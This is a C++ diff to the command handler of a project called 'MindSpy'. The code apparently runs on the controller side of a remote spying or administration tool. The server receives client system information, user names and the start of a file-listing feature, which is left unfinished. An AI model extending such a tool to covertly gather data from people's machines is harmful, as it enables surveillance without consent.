@@ -137,7 +137,7 @@ namespace MindSpy
 			else if (resp < 0)
 				break;
 
-			UINT32 comando = *(UINT32*)(szBuff+4);
+			UINT32 comando = *(UINT32*)(szBuff+sizeof(UINT32));
 
 			switch (comando)
 			{
@@ -146,7 +146,7 @@ namespace MindSpy
 				break;
 
 			case CLNT_CMDS::VERSION:
-				cout << "Version del cliente: " << &szBuff[4] << endl;
+				wcout << L"Version del cliente: " << (wchar_t*)&szBuff[8] << endl;
 				break;
 
 			case CLNT_CMDS::SYSINFO:
@@ -161,6 +161,14 @@ namespace MindSpy
 				wcout << L"Arquitectura: " << Conexiones[MyID].SistemaCliente.Arquitectura << L" bits." << endl;
 				wcout << L"Nombre de usuario: " << Conexiones[MyID].SistemaCliente.NombreUsuario << endl;
 				break;
+
+			case CLNT_CMDS::FILEINFO: {
+				stListaArchivos stla;
+				BYTE *ReceivedData = (BYTE*)(szBuff+8);
+				UINT32 SizeOfReceivedData = *(UINT32*)(szBuff);
+				wcout << L"Data recibida: " << SizeOfReceivedData << endl;
+			}
+
 			}
 		}
 		wcout << L"Cerrando conexion con " << Conexiones[MyID].IP << L" (" << Conexiones[MyID].ID << L")..." << endl;
